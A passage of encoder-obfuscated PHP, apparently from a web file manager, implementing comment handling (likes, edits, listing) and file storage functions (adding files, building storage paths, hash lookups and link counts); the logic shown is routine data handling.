$f´ª—◊§„¶[$AüëÿëÜÇ‘[1741]] = Model($AüëÿëÜÇ‘[495])->userListInfo($eÆΩã¢ÌÚŒ); goto A≈›ÊÑÍ÷ô; døáæÀ¬ˆë: $AüëÿëÜÇ‘ =& $_SERVER[™⁄»üÆ]; $e‹è®ŸÍå· = array($AüëÿëÜÇ‘[1742] => $d—π¥äì∫Œ); $BÉÊﬁû≈õµ = $this->where($e‹è®ŸÍå·)->find(); goto DÉº√òÁË…; DÉº√òÁË…: $EÆ»Í◊ïéà = _get($BÉÊﬁû≈õµ, $AüëÿëÜÇ‘[1737], 0); $f´ª—◊§„¶ = array($AüëÿëÜÇ‘[253] => $EÆ»Í◊ïéà, $AüëÿëÜÇ‘[1741] => array()); if (!$EÆ»Í◊ïéà) { return $f´ª—◊§„¶; } goto AÓÀÔﬁÍîê; A≈›ÊÑÍ÷ô: return $f´ª—◊§„¶; goto fµ¢»ü·¿›; fµ¢»ü·¿›: } public function remove($eù∂€€π¢å) { $F°ìÏî«á‘ =& $_SERVER[™⁄»üÆ]; $aôª÷Ÿ§¯„ = array($F°ìÏî«á‘[1735] => $eù∂€€π¢å); $F“≠˜∞ŒÖ≠ = $this->where($aôª÷Ÿ§¯„)->find(); if ($F“≠˜∞ŒÖ≠[$F°ìÏî«á‘[1734]]) { $this->where(array($F°ìÏî«á‘[1735] => $F“≠˜∞ŒÖ≠[$F°ìÏî«á‘[1734]]))->setAdd($F°ìÏî«á‘[1736], -1); } return $this->where($aôª÷Ÿ§¯„)->delete(); } public function edit($bîôùÜã‘…, $CàçôßîîÙ) { $fµÇ¶◊∏Óö =& $_SERVER[™⁄»üÆ]; $cÉ¥öô•—Í = array($fµÇ¶◊∏Óö[1735] => $bîôùÜã‘…); return $this->where($cÉ¥öô•—Í)->save(array($fµÇ¶◊∏Óö[1744] => $CàçôßîîÙ)); } public function prasise($eõ‡—…ùó†) { $c®ä™≤€À‡ =& $_SERVER[™⁄»üÆ]; $b¢Ì◊ÃÃå® = Model($c®ä™≤€À‡[1745]); $f’àû±ÜÂÖ = array($c®ä™≤€À‡[1735] => $eõ‡—…ùó†, $c®ä™≤€À‡[1528] => USER_ID); $A©´·¶¿œ∑ = $b¢Ì◊ÃÃå®->where($f’àû±ÜÂÖ)->find(); if (!$A©´·¶¿œ∑) { $b¢Ì◊ÃÃå®->add($f’àû±ÜÂÖ); $fòÈø¬Ñœ¢ = $this->where(array($c®ä™≤€À‡[1735] => $eõ‡—…ùó†))->setAdd($c®ä™≤€À‡[1737], 1); } else { $b¢Ì◊ÃÃå®->where($f’àû±ÜÂÖ)->delete(); $fòÈø¬Ñœ¢ = $this->where(array($c®ä™≤€À‡[1735] => $eõ‡—…ùó†))->setAdd($c®ä™≤€À‡[1737], -1); } return $fòÈø¬Ñœ¢; } public function targetInfo($fıèÔÚœ´à, $b∏·¯‹¢Æà) { goto d≥ﬂàù¡•; F¥öáé‡—›: return $BùäˆæùœÀ; goto Bœå⁄“¯≤—; bíùãŒ∞Ûé: $bÜÑß≠÷Á¬ = "\122\111\x47\x48\x54\x20\112\x4f\x49\116\x20{$this->tablePrefix}\x63\157\155\155\x65\x6e\x74\137\x70\162\141\x69\163\x65\x20\x73\164\141\162\40\157\156\40\143\157\x6d\x6d\145\x6e\164\x2e\x63\157\x6d\x6d\x65\x6e\164\111\104\x20\x3d\40\x73\x74\141\x72\x2e\143\157\155\155\x65\156\x74\111\x44"; $D≤≥û∞“¡Á = $this->alias($EÛÑ∂Ÿ…ë°[352])->where($c•áîï‚åò)->join($bÜÑß≠÷Á¬, $EÛÑ∂Ÿ…ë°[1746])->count(); $BùäˆæùœÀ = array($EÛÑ∂Ÿ…ë°[1747] => $f€ùçõœ¥¨, $EÛÑ∂Ÿ…ë°[1748] => $D≤≥û∞“¡Á); goto F¥öáé‡—›; d≥ﬂàù¡•: $EÛÑ∂Ÿ…ë° =& $_SERVER[™⁄»üÆ]; $c•áîï‚åò = array($EÛÑ∂Ÿ…ë°[563] => $fıèÔÚœ´à, $EÛÑ∂Ÿ…ë°[564] => $b∏·¯‹¢Æà); $f€ùçõœ¥¨ = $this->where($c•áîï‚åò)->count(); goto bíùãŒ∞Ûé; Bœå⁄“¯≤—: } public function listData($BÊÓÏ€Œ÷˘) { $a÷‡îåîàÇ =& $_SERVER[™⁄»üÆ]; if (isset($BÊÓÏ€Œ÷˘[$a÷‡îåîàÇ[1749]])) { if ($BÊÓÏ€Œ÷˘[$a÷‡îåîàÇ[1749]]) { $BÊÓÏ€Œ÷˘[$a÷‡îåîàÇ[1742]] = array($a÷‡îåîàÇ[981], intval($BÊÓÏ€Œ÷˘[$a÷‡îåîàÇ[1749]])); } unset($BÊÓÏ€Œ÷˘[$a÷‡îåîàÇ[1749]]); } if (isset($BÊÓÏ€Œ÷˘[$a÷‡îåîàÇ[1750]])) { if ($BÊÓÏ€Œ÷˘[$a÷‡îåîàÇ[1750]]) { $BÊÓÏ€Œ÷˘[$a÷‡îåîàÇ[1742]] = array($a÷‡îåîàÇ[978], intval($BÊÓÏ€Œ÷˘[$a÷‡îåîàÇ[1750]])); } unset($BÊÓÏ€Œ÷˘[$a÷‡îåîàÇ[1750]]); } return $this->_listData($BÊÓÏ€Œ÷˘); } private function _listData($bõùäàöÜΩ) { $d•æáŸüó∞ =& $_SERVER[™⁄»üÆ]; $EôﬁÇ–è¨î = $this->where($bõùäàöÜΩ)->_makeOrder()->selectPage(100); $this->_listAppendParent($EôﬁÇ–è¨î[$d•æáŸüó∞[367]]); $this->_listAppendUser($EôﬁÇ–è¨î[$d•æáŸüó∞[367]]); $this->_listAppendMeta($EôﬁÇ–è¨î[$d•æáŸüó∞[367]]); return $EôﬁÇ–è¨î; } private function _makeOrder() { $d‹ÑãéŒ®∂ =& $_SERVER[™⁄»üÆ]; $Dèäƒãñ˘√ = array($d‹ÑãéŒ®∂[1737], $d‹ÑãéŒ®∂[1736], $d‹ÑãéŒ®∂[194]); $Dö¶Ñ±⁄≈Ë = Input::get($d‹ÑãéŒ®∂[436], $d‹ÑãéŒ®∂[7], $d‹ÑãéŒ®∂[417], $Dèäƒãñ˘√); $Fÿ–»œ¢ª√ = Input::get($d‹ÑãéŒ®∂[437], $d‹ÑãéŒ®∂[7], $d‹ÑãéŒ®∂[1530], array($d‹ÑãéŒ®∂[1751], $d‹ÑãéŒ®∂[432])); $eÌ´…ª¢õ‰ = $Dö¶Ñ±⁄≈Ë . $d‹ÑãéŒ®∂[50] . $Fÿ–»œ¢ª√; return $this->order($eÌ´…ª¢õ‰); } private function _listAppendParent(&$a™à«Œ±â®) { goto b¿†ÎÍ§¬‡; d⁄Ô“˜æêΩ: foreach ($a™à«Œ±â® as &$f◊ˆåËÑåë) { if (isset($fªˆŒ –≤‡[$f◊ˆåËÑåë[$a´‘ÀÌËŒñ[1734]]])) { $f◊ˆåËÑåë[$a´‘ÀÌËŒñ[1752]] = $fªˆŒ –≤‡[$f◊ˆåËÑåë[$a´‘ÀÌËŒñ[1734]]]; } } unset($f◊ˆåËÑåë); goto D«àœ≥¥ ÿ; b¿†ÎÍ§¬‡: $a´‘ÀÌËŒñ =& $_SERVER[™⁄»üÆ]; $b¬ÜÇùÈ˜Ç = array_unique(array_to_keyvalue($a™à«Œ±â®, $a´‘ÀÌËŒñ[33], $a´‘ÀÌËŒñ[1734])); $b¬ÜÇùÈ˜Ç = array_remove_value($b¬ÜÇùÈ˜Ç, $a´‘ÀÌËŒñ[191]); goto cµúãËè˘Ò; cµúãËè˘Ò: if (!$b¬ÜÇùÈ˜Ç) { return; } $fªˆŒ –≤‡ = $this->where(array($a´‘ÀÌËŒñ[1735] => array($a´‘ÀÌËŒñ[7], $b¬ÜÇùÈ˜Ç)))->select(); $fªˆŒ –≤‡ = array_to_keyvalue($fªˆŒ –≤‡, $a´‘ÀÌËŒñ[1742]); goto d⁄Ô“˜æêΩ; D«àœ≥¥ ÿ: } private function _listAppendUser(&$bÿÓçåèö…) { goto A∞‘”º≈„◊; A∞‘”º≈„◊: $B® ‡™ñ≥ã =& $_SERVER[™⁄»üÆ]; $cŒ”Àê∏ÈÏ = array_unique(array_to_keyvalue($bÿÓçåèö…, $B® ‡™ñ≥ã[33], $B® ‡™ñ≥ã[1537])); $cŒ”Àê∏ÈÏ = array_remove_value($cŒ”Àê∏ÈÏ, $B® ‡™ñ≥ã[191]); goto dò»≥Ìã∑‘; dò»≥Ìã∑‘: if (count($cŒ”Àê∏ÈÏ) == 0) { return; } foreach ($bÿÓçåèö… as $D¶‰∂≠†‡ú) { if (isset($D¶‰∂≠†‡ú[$B® ‡™ñ≥ã[1752]])) { $cŒ”Àê∏ÈÏ[] = $D¶‰∂≠†‡ú[$B® ‡™ñ≥ã[1752]][$B® ‡™ñ≥ã[1537]]; } } $BÕëÚ¿¨∏¡ = Model($B® ‡™ñ≥ã[520])->userListInfo($cŒ”Àê∏ÈÏ); goto d…çì™ √ÿ; d…çì™ √ÿ: foreach ($bÿÓçåèö… as &$D¶‰∂≠†‡ú) { $D¶‰∂≠†‡ú[$B® ‡™ñ≥ã[576]] = $BÕëÚ¿¨∏¡[$D¶‰∂≠†‡ú[$B® ‡™ñ≥ã[1537]]]; if (isset($D¶‰∂≠†‡ú[$B® ‡™ñ≥ã[1752]])) { $D¶‰∂≠†‡ú[$B® ‡™ñ≥ã[1752]][$B® ‡™ñ≥ã[576]] = $BÕëÚ¿¨∏¡[$D¶‰∂≠†‡ú[$B® ‡™ñ≥ã[1752]][$B® ‡™ñ≥ã[1537]]]; } } unset($D¶‰∂≠†‡ú); goto eìπçèã‚ˆ; eìπçèã‚ˆ: } private function _listAppendMeta(&$FÖ‘∂’å∫è) { goto dÿÖ≥·Ë›ÿ; dÓÛ¥ä‡≤õ: if (!$BÖ≈âŒº∆¢) { return !1; } foreach ($FÖ‘∂’å∫è as &$a´˜πœÏÆ¿) { $a´˜πœÏÆ¿[$BõÓ≥∫Â⁄∂[446]] = $BÖ≈âŒº∆¢[$a´˜πœÏÆ¿[$BõÓ≥∫Â⁄∂[1742]]]; if (isset($a´˜πœÏÆ¿[$BõÓ≥∫Â⁄∂[1752]])) { $a´˜πœÏÆ¿[$BõÓ≥∫Â⁄∂[1752]][$BõÓ≥∫Â⁄∂[446]] = $BÖ≈âŒº∆¢[$a´˜πœÏÆ¿[$BõÓ≥∫Â⁄∂[1752]][$BõÓ≥∫Â⁄∂[1742]]]; } } unset($a´˜πœÏÆ¿); goto d§πæ™¨™≤; dÿÖ≥·Ë›ÿ: $BõÓ≥∫Â⁄∂ =& $_SERVER[™⁄»üÆ]; $e·éù‚’¯ö = array_unique(array_to_keyvalue($FÖ‘∂’å∫è, $BõÓ≥∫Â⁄∂[33], $BõÓ≥∫Â⁄∂[1742])); $e·éù‚’¯ö = array_remove_value($e·éù‚’¯ö, $BõÓ≥∫Â⁄∂[191]); goto aÌŒ§©æÀ¯; aÌŒ§©æÀ¯: if (!$e·éù‚’¯ö) { return; } foreach ($FÖ‘∂’å∫è as $a´˜πœÏÆ¿) { if (isset($a´˜πœÏÆ¿[$BõÓ≥∫Â⁄∂[1752]])) { $e·éù‚’¯ö[] = $a´˜πœÏÆ¿[$BõÓ≥∫Â⁄∂[1752]][$BõÓ≥∫Â⁄∂[1742]]; } } $BÖ≈âŒº∆¢ = $this->metaList($e·éù‚’¯ö); goto dÓÛ¥ä‡≤õ; d§πæ™¨™≤: } private function metaList($DãÔ´›îÁ‹) { goto aï¥œ‘å÷£; BÂ‡Ÿ∑ÇÜë: return $Dﬁôë¢™ﬁÖ ? $Dﬁôë¢™ﬁÖ : array(); goto A≈æƒÆ∑ï ; bû›Ø‚¢“Õ: $Dﬁôë¢™ﬁÖ = Model($FÌÊí≠íÃ˘[1753])->where($e∂•à√ºñà)->select(); $Dﬁôë¢™ﬁÖ = array_to_keyvalue_group($Dﬁôë¢™ﬁÖ, $FÌÊí≠íÃ˘[1742]); foreach ($Dﬁôë¢™ﬁÖ as $C¥‚àõ•¢ú => $f¯Îƒ‘›ûÂ) { $eﬁü∏¬ıß” = array(); foreach ($f¯Îƒ‘›ûÂ as $Bﬂ¥Ê∑´ÿ) { $eﬁü∏¬ıß”[$Bﬂ¥Ê∑´ÿ[$FÌÊí≠íÃ˘[93]]] = $Bﬂ¥Ê∑´ÿ[$FÌÊí≠íÃ˘[372]]; } $Dﬁôë¢™ﬁÖ[$C¥‚àõ•¢ú] = $eﬁü∏¬ıß”; } goto BÂ‡Ÿ∑ÇÜë; aï¥œ‘å÷£: $FÌÊí≠íÃ˘ =& $_SERVER[™⁄»üÆ]; if (!$DãÔ´›îÁ‹) { return array(); } $e∂•à√ºñà = array($FÌÊí≠íÃ˘[1742] => array($FÌÊí≠íÃ˘[7], $DãÔ´›îÁ‹)); goto bû›Ø‚¢“Õ; A≈æƒÆ∑ï : } } class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\137\x66\151\154\x65\137\143\157\156\x74\x65\x6e\x74\x73"; protected $dataAuto = array(array("\x63\162\145\141\x74\145\x54\x69\155\x65", "\x74\x69\155\x65", "\x69\156\x73\x65\162\x74", "\146\165\x6e\143\x74\151\x6f\156")); } class FileModel extends ModelBase { protected $tableName = "\151\157\x5f\146\x69\154\x65"; protected $tableMeta = array("\x74\x61\142\154\x65\x4e\x61\155\x65" => "\x69\x6f\137\146\151\x6c\x65\137\155\145\x74\x61", "\155\145\x74\x61\106\151\x65\154\x64" => "\x66\x69\x6c\145\x49\x44"); public function fileInfo($AúÓçàà…÷) { $DÊÿà›ó£∂ =& $_SERVER[™⁄»üÆ]; static $A’«·Æ≤’â = array(); if (!isset($A’«·Æ≤’â[$AúÓçàà…÷])) { $dØûó∏ÈÑ¯ = $DÊÿà›ó£∂[1754]; $FèÃ°‘∞Îó = Model($DÊÿà›ó£∂[451])->field($dØûó∏ÈÑ¯)->where(array($DÊÿà›ó£∂[449] => $AúÓçàà…÷))->find(); $A’«·Æ≤’â[$AúÓçàà…÷] = $FèÃ°‘∞Îó; } return $A’«·Æ≤’â[$AúÓçàà…÷]; } public function addFileByContent($aòœ¢ª’Øÿ = '', $f∏Î‡õ“†¡ = '') { goto F°ﬂã¿á£ê; BÖ€É¢Î∏®: if (file_exists($B∏Çîá êè)) { @unlink($B∏Çîá êè); } return $AüÎﬁÊãÏÀ; goto e¬ŒÉÙ£ãî; F°ﬂã¿á£ê: $D´Ô•¶·õ¯ =& $_SERVER[™⁄»üÆ]; $b˜Ó†⁄˘€ = TEMP_PATH . $D´Ô•¶·õ¯[1755]; if (!is_dir($b˜Ó†⁄˘€)) { mk_dir($b˜Ó†⁄˘€); } goto bïÒ¡œ◊ãÜ; bïÒ¡œ◊ãÜ: $B∏Çîá êè = $b˜Ó†⁄˘€ . $D´Ô•¶·õ¯[1756] . rand_string(16); file_put_contents($B∏Çîá êè, $aòœ¢ª’Øÿ); $AüÎﬁÊãÏÀ = $this->addFile($B∏Çîá êè, $f∏Î‡õ“†¡, !0); goto BÖ€É¢Î∏®; e¬ŒÉÙ£ãî: } public function createFileName($eé∂éÍ∂Ôã, $aÉ±ÌÈÒœç = false, $CõâÖÏŸﬁÿ = false) { goto D°ï’ã∞äÍ; D°ï’ã∞äÍ: $b®üÚÜ‰òû =& $_SERVER[™⁄»üÆ]; $D∂Ÿπ‡√£’ = IO::init($b®üÚÜ‰òû[8]); $a˜Ññ„Éªÿ = $this->makeFilePath($eé∂éÍ∂Ôã, $D∂Ÿπ‡√£’, $aÉ±ÌÈÒœç, $CõâÖÏŸﬁÿ); goto d§¶¬ﬁÂ∫Ò; d§¶¬ﬁÂ∫Ò: $fºâ⁄àõ∆é = $D∂Ÿπ‡√£’->pathFather($a˜Ññ„Éªÿ); static $Dü”Ö‘∑¨© = false; $bæûÏÆ·äö = $b®üÚÜ‰òû[1757] . md5($fºâ⁄àõ∆é); goto Cà  ≤çúû; Cà  ≤çúû: if (!$Dü”Ö‘∑¨© && !Cache::get($bæûÏÆ·äö)) { $Dü”Ö‘∑¨© = !0; $a»«‰ßÌƒÖ = IO::mkdir($fºâ⁄àõ∆é); if (!IO::exist($a»«‰ßÌƒÖ . $b®üÚÜ‰òû[780])) { IO::mkfile($a»«‰ßÌƒÖ . $b®üÚÜ‰òû[780]); } Cache::set($bæûÏÆ·äö, 1, 3600 * 2); } return $a˜Ññ„Éªÿ; goto F°‘¨ª¨‹√; F°‘¨ª¨‹√: } public function makeFilePath($FÉâ¡Ú§’ê, $fÖ∞Ü‹™Ø™, $B≤„Ñåâùö = false, $c’™ÿ›û≈… = false) { goto D£‰¿ÏÊ∫¢; D£‰¿ÏÊ∫¢: $Aç ë◊ÓÃﬁ =& $_SERVER[™⁄»üÆ]; $B∫Ωﬁ∂ÓÏÖ = Model($Aç ë◊ÓÃﬁ[749])->get($Aç ë◊ÓÃﬁ[1758]); $b›Ùè˘ãèÜ = KodIO::defaultIO() . date($Aç ë◊ÓÃﬁ[1759]); goto c”ÿÇïö ; EæÊå±çÁò: if (!$FÉâ¡Ú§’ê) { $B∫Ωﬁ∂ÓÏÖ = $Aç ë◊ÓÃﬁ[1760]; } switch ($B∫Ωﬁ∂ÓÏÖ) { case $Aç ë◊ÓÃﬁ[1761]: $F¬µ≠è˜˘· = $F¬µ≠è˜˘· . $Aç ë◊ÓÃﬁ[95] . $fÖ∞Ü‹™Ø™->ext($FÉâ¡Ú§’ê); if ($Aºø›€¨∞µ == $Aç ë◊ÓÃﬁ[1696]) { $F¬µ≠è˜˘· .= $Aç ë◊ÓÃﬁ[1436]; } break; case $Aç ë◊ÓÃﬁ[1762]: goto B’ùœ£Î¶â; A£ÃÂ÷™‡æ: CacheLock::lock($cùƒó∏∞ Î); $F¬µ≠è˜˘· = $b›Ùè˘ãèÜ . $FÉâ¡Ú§’ê; if (IO::exist($b›Ùè˘ãèÜ . $FÉâ¡Ú§’ê)) { $FÔ¡åßÜÆ∆ = substr($FÉâ¡Ú§’ê, 0, strlen($FÉâ¡Ú§’ê) - strlen($Aºø›€¨∞µ)); $D∏≤ü»÷ı⁄ = $c’™ÿ›û≈… ? substr($c’™ÿ›û≈…, 0, 5) : ($B≤„Ñåâùö ? substr($B≤„Ñåâùö, 0, 5) : rand_string(5)); $F¬µ≠è˜˘· = $b›Ùè˘ãèÜ . $FÔ¡åßÜÆ∆ . $D∏≤ü»÷ı⁄ . $Aç ë◊ÓÃﬁ[95] . $Aºø›€¨∞µ; } goto FÖ‰–´Ï⁄∆; Fç÷õ∫∞◊¢: $b›Ùè˘ãèÜ = $Aç ë◊ÓÃﬁ[1132] . $A˜º≤±õÀ√[$Aç ë◊ÓÃﬁ[394]] . $Aç ë◊ÓÃﬁ[403] . date($Aç ë◊ÓÃﬁ[1763]) . $a¶¥““ﬂÙ€ . $Aç ë◊ÓÃﬁ[8]; if ($Aºø›€¨∞µ == $Aç ë◊ÓÃﬁ[1696]) { $FÉâ¡Ú§’ê .= $Aç ë◊ÓÃﬁ[1436]; } $cùƒó∏∞ Î = $Aç ë◊ÓÃﬁ[1764] . $b›Ùè˘ãèÜ . $FÉâ¡Ú§’ê; goto A£ÃÂ÷™‡æ; FÖ‰–´Ï⁄∆: if (IO::isTypeObject($F¬µ≠è˜˘·) && !IO::isUploadServer($F¬µ≠è˜˘·)) { if (IO::exist($F¬µ≠è˜˘·)) { return $F¬µ≠è˜˘·; } $fﬂ«Úù‰·‡ = IO::setContent($F¬µ≠è˜˘·, $Aç ë◊ÓÃﬁ[33]); if (!$fﬂ«Úù‰·‡) { show_json($Aç ë◊ÓÃﬁ[1765], !1); } } CacheLock::unlock($cùƒó∏∞ Î); break; goto FÉù∫†Üö§; B’ùœ£Î¶â: $F«ƒÉâà˘Û = Model($Aç ë◊ÓÃﬁ[749])->get($Aç ë◊ÓÃﬁ[750]); $a¶¥““ﬂÙ€ = substr(md5($Aç ë◊ÓÃﬁ[751] . $F«ƒÉâà˘Û . date($Aç ë◊ÓÃﬁ[727])), 0, 8); $A˜º≤±õÀ√ = KodIO::defaultDriver(); goto Fç÷õ∫∞◊¢; FÉù∫†Üö§: case $Aç ë◊ÓÃﬁ[1760]: break; default: break; } return $F¬µ≠è˜˘·; goto C˜⁄ Ëè„†; c”ÿÇïö : $F¬µ≠è˜˘· = $b›Ùè˘ãèÜ . rand_string(5) . short_id(100); $FÉâ¡Ú§’ê = str_replace($Aç ë◊ÓÃﬁ[8], $Aç ë◊ÓÃﬁ[71], KodIO::clear($FÉâ¡Ú§’ê)); $Aºø›€¨∞µ = $fÖ∞Ü‹™Ø™->ext($FÉâ¡Ú§’ê); goto EæÊå±çÁò; C˜⁄ Ëè„†: } public function addFileByRemote($C‘Õ·ïŒ‡©, $Eà«õ–˘êÏ, $DΩ†∞ëÿó¬ = array()) { goto döâßá»¡ë; Dûˆü—ÇŸí: $AÁÈ∂ˆóé¨ = IO::hashMd5($C‘Õ·ïŒ‡©, $FüãáÇ⁄æ‘); $böÉûÍÙ∑ç = KodIO::defaultDriver(); $F∆Ü≠÷‚Æ = array($f’è¥ﬂ≠õú[562] => IO::size($C‘Õ·ïŒ‡©), $f’è¥ﬂ≠õú[1766] => 1, $f’è¥ﬂ≠õú[414] => $Eà«õ–˘êÏ, $f’è¥ﬂ≠õú[792] => $böÉûÍÙ∑ç[$f’è¥ﬂ≠õú[394]], $f’è¥ﬂ≠õú[415] => $C‘Õ·ïŒ‡©, $f’è¥ﬂ≠õú[1767] => $DΩ†∞ëÿó¬[$f’è¥ﬂ≠õú[171]] ? $DΩ†∞ëÿó¬[$f’è¥ﬂ≠õú[171]] : IO::hashSimple($C‘Õ·ïŒ‡©), $f’è¥ﬂ≠õú[1768] => $AÁÈ∂ˆóé¨ ? $AÁÈ∂ˆóé¨ : $FüãáÇ⁄æ‘); goto CÖÌŸ∞Ëö´; CÖÌŸ∞Ëö´: if ($cÏ¡è˜ô¢ú = $this->addFileCheckExist($F∆Ü≠÷‚Æ[$f’è¥ﬂ≠õú[171]], $F∆Ü≠÷‚Æ[$f’è¥ﬂ≠õú[170]], $F∆Ü≠÷‚Æ[$f’è¥ﬂ≠õú[78]])) { return $cÏ¡è˜ô¢ú; } return $this->addFileData($F∆Ü≠÷‚Æ); goto Aº‘–Æ«çæ; döâßá»¡ë: $f’è¥ﬂ≠õú =& $_SERVER[™⁄»üÆ]; if (!IO::exist($C‘Õ·ïŒ‡©)) { return !1; } $FüãáÇ⁄æ‘ = $DΩ†∞ëÿó¬[$f’è¥ﬂ≠õú[170]] ? $DΩ†∞ëÿó¬[$f’è¥ﬂ≠õú[170]] : $f’è¥ﬂ≠õú[33]; goto Dûˆü—ÇŸí; Aº‘–Æ«çæ: } private function addFileData($A„”üÊàìí) { $E›Œ…≠‚©« =& $_SERVER[™⁄»üÆ]; if (!$A„”üÊàìí) { return !1; } $A„”üÊàìí[$E›Œ…≠‚©«[78]] = intval($A„”üÊàìí[$E›Œ…≠‚©«[78]]); if (!$A„”üÊàìí[$E›Œ…≠‚©«[78]] && strlen($A„”üÊàìí[$E›Œ…≠‚©«[171]]) > 32) { $A„”üÊàìí[$E›Œ…≠‚©«[78]] = intval(substr($A„”üÊàìí[$E›Œ…≠‚©«[171]], 32)); } $B¯ ß◊‚ßé = $this->add($A„”üÊàìí); return $this->find($B¯ ß◊‚ßé); } public function addFile($e†ãø»ëß±, $cƒÒ‰§ï™™, $a‚Â∞á§‹€ = false) { goto bÖó¬ö˘°∂; bÖó¬ö˘°∂: $F–‡ÉçÑ°Ç = IO::hashSimple($e†ãø»ëß±); $AÕèÇ®ê‰ = IO::hashMd5($e†ãø»ëß±); $bÖÒ∞ê¨†ı = IO::size($e†ãø»ëß±); goto e√˘§áæ›Ë; BŒŸ‹·Ë∑®: $BÛ¶¿ö∑î¯ = $this->addFileMake($e†ãø»ëß±, $bÖÒ∞ê¨†ı, $F–‡ÉçÑ°Ç, $AÕèÇ®ê‰, $cƒÒ‰§ï™™, $a‚Â∞á§‹€); $fÌ™¨≥ÙÁê = $this->addFileData($BÛ¶¿ö∑î¯); CacheLock::unlock($dÍƒì¶´Âé); goto EìíÁÀ•›ª; e√˘§áæ›Ë: $dÍƒì¶´Âé = $_SERVER[™⁄»üÆ][1769] . $AÕèÇ®ê‰; CacheLock::lock($dÍƒì¶´Âé); if ($CπÛØ»‹ë‹ = $this->addFileCheckExist($F–‡ÉçÑ°Ç, $AÕèÇ®ê‰, $bÖÒ∞ê¨†ı)) { CacheLock::unlock($dÍƒì¶´Âé); return $CπÛØ»‹ë‹; } goto BŒŸ‹·Ë∑®; EìíÁÀ•›ª: return $fÌ™¨≥ÙÁê; goto AÛÕßòâ‹È; AÛÕßòâ‹È: } public function addFileMake($fÈâÔÓôÓÉ, $AÏâ€÷≤™⁄, $Eô®Õú¶Á⁄, $EÛÙÀÜ††º, $AÍ¶ıö¶ﬂµ, $a◊éÕÇÉ¬°) { goto B±ß˘≤ñ´ã; EÎ∑“ô¯íŒ: $Cú•»ä›Çï = KodIO::defaultDriver(); $B¯™‚Èª≈Ω = array($fπòÇ–™ÖΩ[562] => $AÏâ€÷≤™⁄, $fπòÇ–™ÖΩ[1766] => 1, $fπòÇ–™ÖΩ[414] => $AÍ¶ıö¶ﬂµ, $fπòÇ–™ÖΩ[792] => $Cú•»ä›Çï[$fπòÇ–™ÖΩ[394]], $fπòÇ–™ÖΩ[415] => $eÔúäƒ¡ºú, $fπòÇ–™ÖΩ[1767] => $Eô®Õú¶Á⁄, $fπòÇ–™ÖΩ[1768] => $EÛÙÀÜ††º); return $B¯™‚Èª≈Ω; goto cÔ•ëÀªÖ°; A®ßÁ∞ïÕØ: $C‡ãƒ¥¥´à = get_path_this($eÔúäƒ¡ºú); if ($a◊éÕÇÉ¬°) { $B¡°¡œ’Æú = IO::move($fÈâÔÓôÓÉ, $Côô∑«®∞¨, !1, $C‡ãƒ¥¥´à); } else { $B¡°¡œ’Æú = IO::copy($fÈâÔÓôÓÉ, $Côô∑«®∞¨, !1, $C‡ãƒ¥¥´à); } if (!$B¡°¡œ’Æú) { return !1; } goto EÎ∑“ô¯íŒ; B±ß˘≤ñ´ã: $fπòÇ–™ÖΩ =& $_SERVER[™⁄»üÆ]; $eÔúäƒ¡ºú = $this->createFileName($AÍ¶ıö¶ﬂµ, $Eô®Õú¶Á⁄, $EÛÙÀÜ††º); $Côô∑«®∞¨ = get_path_father($eÔúäƒ¡ºú); goto A®ßÁ∞ïÕØ; cÔ•ëÀªÖ°: } public function addFileCheckExist($B◊≥ç‘´¯å, $cÑ´Ò◊û«ª, $bﬁÆ©ßñØû) { $EåçÚ¬ÁˆÇ =& $_SERVER[™⁄»üÆ]; $dãè®‘Ê„¢ = $this->findByHash($B◊≥ç‘´¯å, $cÑ´Ò◊û«ª); if (!$dãè®‘Ê„¢) { return !1; } $bíóÇ–Ûö≈ = array($EåçÚ¬ÁˆÇ[1766] => intval($dãè®‘Ê„¢[$EåçÚ¬ÁˆÇ[1770]]) + 1, $EåçÚ¬ÁˆÇ[562] => $bﬁÆ©ßñØû); $this->where(array($EåçÚ¬ÁˆÇ[449] => $dãè®‘Ê„¢[$EåçÚ¬ÁˆÇ[448]]))->save($bíóÇ–Ûö≈); return $dãè®‘Ê„¢; } public function remove($e¥èÒâË‘è) { $this->linkCountChange($e¥èÒâË‘è, !1); $this->clearEmpty(); return !0; } public function linkAdd($CÖ∑ÓÎ¨ßß) { $this->linkCountChange($CÖ∑ÓÎ¨ßß, !0); } public function linkCountChange($B∆Í—ó›∞õ, $AÓïö€·ØË) { goto aóå∂úÌ¿∂; a∏€À£¢æˆ: $EîÌ‚È»À√ = array(); foreach ($B∆Í—ó›∞õ as $fΩ¯éìíòß) { $f‰ÕÛπ¯Öå = $fΩ¯éìíòß . $DÀº®»⁄”Ì[33]; if (!$EîÌ‚È»À√[$f‰ÕÛπ¯Öå]) { $EîÌ‚È»À√[$f‰ÕÛπ¯Öå] = 0; } $EîÌ‚È»À√[$f‰ÕÛπ¯Öå]++; } $FÌ»ﬂÍ´›’ = array(); goto eÔÕú§ÆÎÉ; aóå∂úÌ¿∂: $DÀº®»⁄”Ì =& $_SERVER[™⁄»üÆ]; if (!$B∆Í—ó›∞õ) { return; } if (!is_array($B∆Í—ó›∞õ)) { $B∆Í—ó›∞õ = array($B∆Í—ó›∞õ); } goto a∏€À£¢æˆ; eÔÕú§ÆÎÉ: foreach ($EîÌ‚È»À√ as $fΩ¯éìíòß => $CÇäıÃËö†) { $f‰ÕÛπ¯Öå = $CÇäıÃËö† . $DÀº®»⁄”Ì[33]; if (!$FÌ»ﬂÍ´›’[$f‰ÕÛπ¯Öå]) { $FÌ»ﬂÍ´›’[$f‰ÕÛπ¯Öå] = array(); } $FÌ»ﬂÍ´›’[$f‰ÕÛπ¯Öå][] = $fΩ¯éìíòß; } foreach ($FÌ»ﬂÍ´›’ as $CÇäıÃËö† => $B°ˆûç·ÇÈ) { if (!$B°ˆûç·ÇÈ) { continue; } $CÇäıÃËö† = $AÓïö€·ØË ? $CÇäıÃËö† : -intval($CÇäıÃËö†); $dˆç©ë∆÷á = array($DÀº®»⁄”Ì[448] => array($DÀº®»⁄”Ì[7], $B°ˆûç·ÇÈ)); if ($CÇäıÃËö† < 0) { $dˆç©ë∆÷á[$DÀº®»⁄”Ì[1770]] = array($DÀº®»⁄”Ì[982], abs($CÇäıÃËö†)); } $this->where($dˆç©ë∆÷á)->setAdd($DÀº®»⁄”Ì[1770], $CÇäıÃËö†); } goto aè¡¶≈€æ; aè¡¶≈€æ: } public function findByHash($fÖŒèé„õô, $C€·∑•’ãÚ = false) { $E§‡ÑÊçŒ =& $_SERVER[™⁄»üÆ]; if (!$fÖŒèé„õô && !$C€·∑•’ãÚ) { return !1; } 